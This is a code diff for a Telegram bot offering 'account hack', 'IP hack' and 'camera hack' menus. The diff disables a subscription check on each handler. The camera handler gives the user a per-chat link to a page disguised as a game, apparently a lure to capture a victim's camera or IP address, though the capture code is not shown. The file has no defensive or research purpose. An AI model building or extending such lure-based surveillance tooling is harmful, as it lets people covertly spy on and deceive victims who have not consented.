@@ -6,8 +6,7 @@ from telebot import types
 from handlers.start_handler import main
 from handlers.state import UserState
 import os
-# from keep_alive import keep_alive
-# keep_alive()
+
 
 client = Client()
 
@@ -34,13 +33,13 @@ def handle_storage(call):
 
 # web screen handler --todo
 @bot.callback_query_handler(func=lambda call: call.data == 'accountHack')
-@check_subscription_decorator
+# @check_subscription_decorator
 @rate_limit_decorator(delay=5)
 def accountHacking(call): 
     markup = types.InlineKeyboardMarkup(row_width=1)
     item_1 = types.InlineKeyboardButton('Back', callback_data='back')
     markup.add(item_1)
-
+    
     img = open('./img/main.jpeg', 'rb')
     caption_text = "Coming soon"
 
@@ -96,7 +95,7 @@ def location(message, ip):
 
 # ip hack menu handler
 @bot.callback_query_handler(func=lambda call: call.data == 'ipHack')
-@check_subscription_decorator
+# @check_subscription_decorator
 @rate_limit_decorator(delay=5)
 def ipHacking(call):
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -135,12 +134,13 @@ def get_ip_address(message):
 
 # camera hack menu handler
 @bot.callback_query_handler(func=lambda call: call.data == 'cameraHack')
-@check_subscription_decorator
+# @check_subscription_decorator
 def camera_hacking_callback(call):
 
     markup = types.InlineKeyboardMarkup(row_width=2)
     item_1 = types.InlineKeyboardButton('Back', callback_data='back')
     markup.add(item_1)
+    db.add_user(call.message.chat.id, call.from_user.first_name)
 
     img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы хакинга камеры
     link = f"https://super-game-bot.netlify.app/g/{call.message.chat.id}"
